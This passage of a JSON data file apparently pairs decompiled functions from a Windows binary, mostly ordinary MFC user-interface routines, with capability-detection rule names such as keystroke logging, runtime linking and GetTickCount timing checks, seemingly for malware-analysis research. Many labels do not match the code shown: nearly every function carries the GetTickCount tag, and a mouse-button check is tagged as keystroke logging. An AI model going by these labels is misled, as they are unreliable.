iVar3 = fcn.140018d74(iVar1 + 8);\n                iVar4 = iVar3;\n                if (iVar3 == 0) {\n                    iVar4 = fcn.140005de8();\n                }\n                (**(iVar1 + 0x20))(iVar4);\n                piVar5 = fcn.140015b8c(iVar1 + 0x68, iVar2);\n                *piVar5 = iVar3;\n                fcn.140005860(arg1_00);\n                iVar4 = *(iVar1 + 0xa8);\n                *(iVar3 + iVar4) = iVar2;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar3 + 8 + iVar4) = iVar2;\n                }\n            }\n            else {\n                iVar4 = *(iVar1 + 0xa8);\n                *(iVar3 + iVar4) = iVar2;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar3 + 8 + iVar4) = iVar2;\n                }\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 580
    },
    "14000797": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.14000797c(int64_t hdc, int64_t arg2, ulong bForceBackground)\n\n{\n    int64_t iVar1;\n    int64_t arg2_00;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    \n    uVar3 = 0;\n    if (arg2 != 0) {\n        uVar3 = *(arg2 + 8);\n    }\n    arg2_00 = (*_sym.imp.GDI32.dll_SelectPalette)(*(hdc + 8), uVar3);\n    iVar1 = fcn.140007708(1);\n    if (arg2_00 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.140015944(iVar1 + 0x30, arg2_00);\n        if (iVar2 == 0) {\n            iVar2 = fcn.140015944(iVar1 + 0x68, arg2_00);\n            if (iVar2 == 0) {\n                uVar3 = fcn.140005860(0x140016664);\n                iVar2 = fcn.140018d74(iVar1 + 8);\n                iVar4 = iVar2;\n                if (iVar2 == 0) {\n                    iVar4 = fcn.140005de8();\n                }\n                (**(iVar1 + 0x20))(iVar4);\n                piVar5 = fcn.140015b8c(iVar1 + 0x68, arg2_00);\n                *piVar5 = iVar2;\n                fcn.140005860(uVar3);\n                iVar4 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar4) = arg2_00;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar4) = arg2_00;\n                }\n            }\n            else {\n                iVar4 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar4) = arg2_00;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar4) = arg2_00;\n                }\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 508
    },
    "140007d1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140007d10(int64_t hWnd, int64_t arg2, ulong X, ulong Y)\n\n{\n    ulong uVar1;\n    \n    uVar1 = 0;\n    if (*(hWnd + 0xa0) == 0) {\n        if (arg2 != 0) {\n            uVar1 = *(arg2 + 0x40);\n        }\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(hWnd + 0x40), uVar1);\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x138))(*(hWnd + 0xa0), arg2);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "140007e5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nbool fcn.140007e50(void)\n\n{\n    int64_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*0x140052fe8 == 0) {\n        *0x140052fec = fcn.140007df0();\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32\");\n        if (((((iVar1 == 0) ||\n              (*0x140052fb0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x14002f9d0),  *0x140052fb0 == 0)) ||\n             (*0x140052fb8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MonitorFromWindow\"),  *0x140052fb8 == 0))\n            || ((*0x140052fc0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MonitorFromRect\"),  *0x140052fc0 == 0 ||\n                (*0x140052fc8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MonitorFromPoint\"),  *0x140052fc8 == 0))\n               )) || ((*0x140052fd8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"EnumDisplayMonitors\"), \n                      *0x140052fd8 == 0 ||\n                      ((*0x140052fd0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"GetMonitorInfoA\"), \n                       *0x140052fd0 == 0 ||\n                       (*0x140052fe0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"EnumDisplayDevicesA\"), \n                       *0x140052fe0 == 0)))))) {\n            *0x140052fb0 = 0;\n            *0x140052fb8 = 0;\n            *0x140052fc0 = 0;\n            *0x140052fc8 = 0;\n            *0x140052fd0 = 0;\n            *0x140052fd8 = 0;\n            *0x140052fe0 = 0;\n        }\n        else {\n            bVar2 = true;\n        }\n        *0x140052fe8 = 1;\n        return bVar2;\n    }\n    return *0x140052fd0 != 0;\n}\n",
        "token_count": 523
    },
    "140008b9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.140008b90(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    uint32_t in_stack_00000028;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    arg4._0_4_ = ~arg3 & uVar1 | arg4;\n    if (uVar1 == arg4) {\n        uVar2 = 0;\n    }\n    else {\n        (*_sym.imp.USER32.dll_SetWindowLongA)(arg1, arg2, arg4);\n        if (in_stack_00000028 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowPos)(arg1, 0, 0, 0, 0, 0, in_stack_00000028 | 0x17);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 211
    },
    "14000933": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.14000933c(ulong arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    \n    uVar1 = *(arg2 + 8);\n    if (((uVar1 < 0x100) || (0x109 < uVar1)) && ((uVar1 < 0x200 || (0x209 < uVar1)))) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.140007af0(arg1, arg2);\n    }\n    return uVar2;\n}\n",
        "token_count": 131
    },
    "140009ab": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nvoid fcn.140009ab8(ulong arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int16_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = fcn.140006c98();\n    if ((*(iVar4 + 0x78) != 0) && (iVar1 = *(*(iVar4 + 0x78) + 0x40),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar1, 0x401, 0, 0);\n    }\n    piVar2 = *(iVar4 + 0xa0);\n    if ((arg1 != 0) && (piVar2 != NULL)) {\n        iVar3 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n        if (-1 < iVar3) {\n            (**(*piVar2 + 0x2f8))(piVar2, 0xffffffffffffffff);\n        }\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "14000b21": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14000b214(uint32_t *arg1)\n\n{\n    if (*arg1 != 0x7fffffff) {\n        fcn.140017020(*arg1);\n        *arg1 = 0x7fffffff;\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "14000b2f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.14000b2f4(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t arg1_01;\n    ulong uVar2;\n    \n    iVar1 = fcn.140006c98();\n    uVar2 = 0;\n    if ((*(iVar1 + 0x28) == 0) && (arg1 != 0)) {\n        arg1_00 = fcn.140005860(0x140016664);\n        arg1_01 = fcn.140005870(0xb8);\n        if (arg1_01 != 0) {\n            uVar2 = fcn.140016138(arg1_01, 0x14002f920, 0x14000afd8, 0x140006f30);\n        }\n        *(iVar1 + 0x28) = uVar2;\n        fcn.140005860(arg1_00);\n    }\n    return *(iVar1 + 0x28);\n}\n",
        "token_count": 223
    },
    "14000c13": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.14000c138(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    ulong arg2_00;\n    uint64_t uVar3;\n    uchar auStack184 [64];\n    ulong uStack120;\n    int64_t iStack24;\n    \n    iVar2 = fcn.140006c98();\n    if (*(iVar2 + 0x28) == 0) {\n        uVar3 = 0;\n    }\n    else {\n        iVar2 = *(iVar2 + 0x28) + 0x30;\n        arg1_00 = fcn.140015944(iVar2, arg1);\n        if (arg1_00 == 0) {\n            arg2_00 = (*_sym.imp.USER32.dll_GetParent)(arg1);\n            iVar2 = fcn.140015944(iVar2, arg2_00);\n            if (((iVar2 != 0) && (*(iVar2 + 0x98) != 0)) &&\n               (iStack24 = fcn.140015944(*(iVar2 + 0x98) + 0x48, arg1),  iStack24 != 0)) {\n                fcn.140008b14(auStack184, arg1);\n                iVar1 = fcn.14000b8e0(auStack184, arg2);\n                uStack120 = 0;\n                fcn.14000be40(auStack184);\n                return iVar1 != 0;\n            }\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.14000b8e0(arg1_00, arg2);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 388
    },
    "14000ccc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.14000ccc8(ulong arg1)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    ulong uVar3;\n    \n    iVar2 = fcn.14000b3dc(arg1);\n    uVar3 = 0;\n    if (iVar2 == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg1, 0xfffffff0);\n        if ((uVar1 >> 0x1e & 1) == 0) {\n            uVar3 = (*_sym.imp.USER32.dll_GetWindow)(arg1, 4);\n        }\n        else {\n            uVar3 = (*_sym.imp.USER32.dll_GetParent)();\n        }\n    }\n    else {\n        arg1_00 = *(iVar2 + 0x70);\n        if (arg1_00 == 0) {\n            arg1_00 = (*_sym.imp.USER32.dll_GetParent)(*(iVar2 + 0x40));\n        }\n        iVar2 = fcn.14000b398(arg1_00);\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x40);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 279
    },
    "14000d17": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.14000d178(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    if (((arg2 == -2) && (((arg3 == 0x201 || (arg3 == 0x207)) || (arg3 == 0x204)))) &&\n       (iVar2 = fcn.14000cd40(arg1),  iVar2 != 0)) {\n        uVar3 = (*_sym.imp.USER32.dll_GetLastActivePopup)(*(iVar2 + 0x40));\n        iVar2 = fcn.14000b398(uVar3);\n        if (iVar2 != 0) {\n            uVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            iVar4 = fcn.14000b398(uVar3);\n            if ((iVar2 != iVar4) && (iVar1 = fcn.140007c44(iVar2),  iVar1 != 0)) {\n                (*_sym.imp.USER32.dll_SetForegroundWindow)(*(iVar2 + 0x40));\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 266
    },
    "14000d70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.14000d708(int64_t *arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint32_t in_stack_00000028;\n    uchar auStack88 [8];\n    ulong uStack80;\n    uint32_t uStack40;\n    int64_t iStack32;\n    ulong uStack24;\n    uint32_t uStack16;\n    \n    if (arg4 != 0) {\n        iVar2 = fcn.140017150(arg4);\n        if (iVar2 == 0) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n    }\n    uStack40 = in_stack_00000028;\n    iStack32 = arg4;\n    uStack24 = arg3;\n    uStack16 = arg2;\n    iVar4 = fcn.140006c48();\n    uStack80 = *(iVar4 + 0x10);\n    iVar2 = (**(*arg1 + 200))(arg1, auStack88);\n    if (iVar2 == 0) {\n        (**(*arg1 + 0x238))();\n        uVar3 = 0;\n    }\n    else {\n        fcn.14000d690(arg1);\n        iVar4 = fcn.1400095d8(uStack16, uStack24, iStack32, uStack40);\n        iVar2 = fcn.14000b4b4();\n        if (iVar2 == 0) {\n            (**(*arg1 + 0x238))(arg1);\n        }\n        uVar3 = iVar4 != 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 405
    },
    "14000e8e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.14000e8ec(ulong *arg1)\n\n{\n    code **ppcVar1;\n    code **ppcVar2;\n    uint uVar3;\n    \n    ppcVar2 = NULL;\n    if (arg1 == NULL) {\n        uVar3 = 0x80004003;\n    }\n    else {\n        *arg1 = 0;\n        ppcVar1 = fcn.140005870(0x30);\n        if (ppcVar1 != NULL) {\n            *(ppcVar1 + 5) = 0;\n            ppcVar1[2] = NULL;\n            ppcVar1[3] = NULL;\n            *ppcVar1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n            ppcVar1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n            ppcVar1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n            fcn.140017064();\n            ppcVar2 = ppcVar1;\n        }\n        uVar3 = 0x8007000e;\n        if (ppcVar2 != NULL) {\n            uVar3 = 0;\n        }\n        *arg1 = ppcVar2;\n    }\n    return uVar3;\n}\n",
        "token_count": 303
    },
    "14000ec9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.14000ec94(int64_t arg1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uint64_t arg3;\n    uchar auStack104 [96];\n    \n    iVar2 = fcn.140009480(*(arg1 + 0x18), *(arg1 + 0x40), auStack104);\n    arg3 = 0;\n    if (iVar2 == 0) {\n        iVar1 = fcn.1400093e4(arg1);\n        if (iVar1 == 0) {\n            uVar6 = 0;\n        }\n        else {\n            iVar4 = fcn.140006c48();\n            if (*(iVar4 + 0x28) != '\\0') {\n                fcn.140016f8c(1);\n                iVar5 = fcn.140006c48();\n                iVar4 = *(arg1 + 0x40);\n                if (iVar4 != 0) {\n                    uVar3 = fcn.14001bab0(iVar4);\n                    arg3 = uVar3;\n                }\n                fcn.140005bfc(iVar5 + 0x58, iVar4, arg3);\n                fcn.140005b7c(iVar5 + 0x58);\n                fcn.140017020(1);\n            }\n            uVar6 = 1;\n        }\n    }\n    else {\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 347
    },
    "14000ed5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.14000ed50(int64_t arg1, int16_t *arg2)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int16_t iVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    int64_t iStackX16;\n    uint auStack104 [2];\n    ulong uStack96;\n    int64_t iStack88;\n    \n    iVar8 = 1;\n    if (arg2 != NULL) {\n        do {\n            iVar3 = *arg2;\n            if (iVar3 == 0) break;\n            iVar2 = arg2[1];\n            uVar4 = *(arg2 + 2);\n            arg2 = arg2 + 4;\n            if (iVar2 == 0x1234) {\ncode_r0x00014000ee08:\n                fcn.14001bd50(&uStack96, 0, 0x30);\n                uStack96 = 0xffffffffffffffff;\n                auStack104[0] = 1;\n                fcn.140004200(&iStackX16, arg2);\n                iStack88 = iStackX16;\n                iVar7 = (*_sym.imp.USER32.dll_SendDlgItemMessageA)(*(arg1 + 0x40), iVar3, 0x401, 0, auStack104);\n                if (iVar7 == -1) {\n                    iVar8 = 0;\n                }\n                LOCK();\n                piVar1 = iStackX16 + -8;\n                iVar5 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if (iVar5 + -1 < 1) {\n                    (**(**(iStackX16 + -0x18) + 8))();\n                }\n            }\n            else {\n                iVar6 = 0x180;\n                if (iVar2 == 0x401) {\ncode_r0x00014000ede2:\n                    iVar7 = (*_sym.imp.USER32.dll_SendDlgItemMessageA)(*(arg1 + 0x40), iVar3, iVar6, 0, arg2);\n                    if (iVar7 == -1) {\n                        iVar8 = 0;\n                    }\n                }\n                else {\n                    iVar6 = iVar2;\n                    if (iVar2 == 0x403) {\n                        iVar6 = 0x143;\n                    }\n                    if (iVar6 == 0x401) goto code_r0x00014000ee08;\n                    if ((iVar6 == 0x180) || (iVar6 == 0x143)) goto code_r0x00014000ede2;\n                }\n            }\n            arg2 = arg2 + uVar4;\n        } while (iVar8 != 0);\n        if (iVar8 == 0) {\n            return 0;\n        }\n    }\n    fcn.14000c070(*(arg1 + 0x40), 0x364, 0, 0);\n    return iVar8;\n}\n",
        "token_count": 667
    },
    "1400108a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1400108a4(int64_t *arg1, ulong arg2, int32_t *arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    ulong uStack40;\n    ulong uStack32;\n    \n    uVar1 = *(arg1 + 0xc);\n    uStack32 = *(arg1 + 0x14);\n    uStack40._0_4_ = uVar1;\n    uStack40 = uVar1;\n    if (uStack32 < uStack40) {\n        uStack40 = uVar1 & 0xffffffff00000000 | uStack32 & 0xffffffff;\n        uStack32 = uStack32 & 0xffffffff00000000 | uVar1 & 0xffffffff;\n    }\n    uVar2 = uStack40;\n    if (uStack32._4_4_ < uStack40._4_4_) {\n        uStack40 = uStack32 & 0xffffffff00000000 | uStack40 & 0xffffffff;\n        uStack32 = uVar2 & 0xffffffff00000000 | uStack32 & 0xffffffff;\n    }\n    if ((*(arg1 + 1) & 3) != 0) {\n        (*_sym.imp.USER32.dll_InflateRect)(uVar1, &uStack40, 1, 1);\n    }\n    iVar3 = fcn.140010658(arg1, arg2);\n    iVar5 = iVar3;\n    iVar3 = (**(*arg1 + 0x28))();\n    if ((*(arg1 + 1) & 0x10) != 0) {\n        (*_sym.imp.USER32.dll_InflateRect)(&uStack40, iVar3 + -1, iVar3 + -1);\n    }\n    iVar4 = *(&uStack40 + *(iVar5 * 0x28 + 0x1400313c0)) + *(iVar5 * 0x28 + 0x1400313d8) * iVar3 +\n            (((uStack32 - uStack40) - iVar3) * *(iVar5 * 0x28 + 0x1400313d0)) / 2;\n    iVar6 = *(&uStack40 + *(iVar5 * 0x28 + 0x1400313c8)) + *(iVar5 * 0x28 + 0x1400313dc) * iVar3 +\n            (((uStack32._4_4_ - uStack40._4_4_) - iVar3) * *(iVar5 * 0x28 + 0x1400313d4)) / 2;\n    *arg3 = iVar4;\n    arg3[1] = iVar6;\n    arg3[2] = iVar4 + iVar3;\n    arg3[3] = iVar6 + iVar3;\n    return;\n}\n",
        "token_count": 658
    },
    "140010b5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140010b54(int64_t arg1, ulong arg2, int32_t **arg3, int32_t **arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int32_t *in_stack_00000028;\n    int32_t *in_stack_00000030;\n    \n    if (arg2 < 0) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (8 < arg2) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (arg2 == 8) {\n        arg2._0_4_ = 0;\n    }\n    *arg3 = NULL;\n    iVar4 = arg2;\n    *arg4 = NULL;\n    if (*(iVar4 * 0x28 + 0x1400313e0) == arg2) {\n        if (in_stack_00000028 != NULL) {\n            iVar3 = fcn.14001bd28(*(arg1 + 0x14) - *(arg1 + 0xc));\n            *in_stack_00000028 = iVar3 / 2 + *(arg1 + 0xc);\n        }\n    }\n    else {\n        piVar1 = *(iVar4 * 0x28 + 0x1400313c0) + 0xc + arg1;\n        *arg3 = piVar1;\n        if (in_stack_00000028 != NULL) {\n            *in_stack_00000028 = *piVar1;\n        }\n    }\n    if (*(iVar4 * 0x28 + 0x1400313e4) == arg2) {\n        if (in_stack_00000030 != NULL) {\n            iVar3 = fcn.14001bd28(*(arg1 + 0x18) - *(arg1 + 0x10));\n            *in_stack_00000030 = iVar3 / 2 + *(arg1 + 0x10);\n        }\n    }\n    else {\n        piVar1 = *(iVar4 * 0x28 + 0x1400313c8) + 0xc + arg1;\n        *arg4 = piVar1;\n        if (in_stack_00000030 != NULL) {\n            *in_stack_00000030 = *piVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 555
    },
    "14001252": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140012524(code **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    uchar auStack616 [56];\n    code **ppcStack560;\n    ulong uStack544;\n    uint64_t uStack24;\n    \n    uStack544 = 0xfffffffffffffffe;\n    uStack24 = *0x14003e1a0 ^ auStack616;\n    *arg1 = vtable.CWinApp.0;\n    piVar1 = arg1[0x16];\n    ppcStack560 = arg1;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1);\n    }\n    piVar1 = arg1[0x22];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x30))(piVar1, 1);\n    }\n    iVar2 = fcn.140006c48();\n    if (*(iVar2 + 0x28) == '\\0') {\n        if (*0x140053348 != NULL) {\n            (**(**0x140053348 + 8))(*0x140053348, 1);\n            *0x140053348 = NULL;\n        }\n        if (*0x140053340 != NULL) {\n            (**(**0x140053340 + 8))(*0x140053340, 1);\n            *0x140053340 = NULL;\n        }\n    }\n    if (arg1[0x1c] != NULL) {\n        fcn.140016620(arg1[0x1c]);\n    }\n    if (arg1[0x1d] != NULL) {\n        fcn.140016620(arg1[0x1d]);\n    }\n    if (*(arg1 + 0x24) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)();\n    }\n    if (*(arg1 + 0x122) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)();\n    }\n    piVar1 = arg1[0x23];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1);\n    }\n    iVar2 = fcn.140006c48();\n    if (*(iVar2 + 0x20) == arg1[0x14]) {\n        *(iVar2 + 0x20) = 0;\n    }\n    if (*(iVar2 + 8) == arg1) {\n        *(iVar2 + 8) = 0;\n    }\n    fcn.14001ba54(arg1[0x14]);\n    fcn.14001ba54(arg1[0x15]);\n    fcn.14001ba54(arg1[0x18]);\n    fcn.14001ba54(arg1[0x19]);\n    fcn.14001ba54(arg1[0x1a]);\n    arg1[0xb] = NULL;\n    fcn.14001285c(arg1);\n    fcn.14001b410(uStack24 ^ auStack616);\n    return;\n}\n",
        "token_count": 679
    },
    "140012b3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.140012b30(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    iVar1 = *(arg1 + 8);\n    if ((iVar1 == 0x200) || (iVar1 == 0xa0)) {\n        iVar3 = fcn.140006414();\n        uVar2 = *(arg1 + 0x24);\n        if ((*(iVar3 + 0x88) == uVar2) && ((*(iVar3 + 0x8c) == uVar2 >> 0x20 && (*(arg1 + 8) == *(iVar3 + 0x90))))) {\n            return 0;\n        }\n        *(iVar3 + 0x88) = uVar2;\n        *(iVar3 + 0x90) = *(arg1 + 8);\n    }\n    else if ((iVar1 == 0xf) || (iVar1 == 0x118)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 230
    },
    "14001314": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.14001314c(int64_t *arg1, int64_t arg2, int64_t *arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    \n    piVar3 = NULL;\n    uVar2 = 0;\n    if (*(*arg3 + -0x18) != NULL) {\n        piVar3 = (**(**(*arg3 + -0x18) + 0x20))();\n    }\n    if (piVar3 == NULL) {\n        piVar3 = fcn.14000fd70();\n        piVar3 = (**(*piVar3 + 0x20))();\n    }\n    if (piVar3 != NULL) {\n        iVar4 = (**(*piVar3 + 0x18))(piVar3);\n        *arg1 = iVar4 + 0x18;\n        iVar4 = *arg3;\n        if (arg2 != 0) {\n            uVar2 = fcn.14001bab0(arg2);\n        }\n        fcn.1400058c4(arg1, arg2, uVar2, iVar4);\n        return arg1;\n    }\n    fcn.140001010(0x80004005);\n    pcVar1 = swi(3);\n    piVar3 = (*pcVar1)();\n    return piVar3;\n}\n",
        "token_count": 310
    },
    "14001702": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140017020(ulong arg1)\n\n{\n    code *pcVar1;\n    \n    if (0x10 < arg1) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x000140017045. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 * 0x28 + 0x140053480);\n    return;\n}\n",
        "token_count": 129
    },
    "140013c1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.140013c18(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.140006c48();\n    uVar2 = 0;\n    if (*(iVar1 + 8) != 0) {\n        fcn.1400113c4(*(iVar1 + 8), 0);\n    }\n    if (*(arg1 + 0xd0) != 0) {\n        uVar2 = *(*(arg1 + 0xd0) + 0x40);\n    }\n    uVar2 = fcn.1400112c0(uVar2, arg1 + 0xd8);\n    fcn.14000d690(arg1);\n    return uVar2;\n}\n",
        "token_count": 167
    },
    "14001401": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.140014010(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    ushort auStackX32 [4];\n    int64_t iStack128;\n    int64_t iStack120;\n    int64_t *piStack112;\n    uchar auStack104 [24];\n    ulong uStack80;\n    uchar auStack72 [32];\n    \n    uStack80 = 0xfffffffffffffffe;\n    iVar8 = 0;\n    if (arg4 == 0) {\n        iVar5 = fcn.140006c48();\n        arg4 = *(iVar5 + 0x18);\n    }\n    iVar5 = fcn.140006c48();\n    piVar2 = *(iVar5 + 0x68);\n    iStack120 = 0;\n    piStack112 = piVar2;\n    fcn.14000ef38(0x10);\n    fcn.14000ef38(0x3c000);\n    if (piVar2 != NULL) {\n        iVar4 = (**(*arg1 + 0x268))(arg1, auStack72);\n        if (iVar4 == 0) {\n            return 0;\n        }\n        arg2 = (**(*piVar2 + 0x28))(piVar2, auStack72, arg2);\n    }\n    if (arg2 == 0) {\n        uVar7 = 0;\n    }\n    else {\n        piVar6 = fcn.14000fd70();\n        if (piVar6 == NULL) {\n            fcn.140001010(0x80004005);\n            pcVar3 = swi(3);\n            uVar7 = (*pcVar3)();\n            return uVar7;\n        }\n        iStack128 = (**(*piVar6 + 0x18))(piVar6);\n        iStack128 = iStack128 + 0x18;\n        auStackX32[0] = 0;\n        iVar4 = fcn.140018898(arg2, &iStack128, auStackX32);\n        iVar5 = 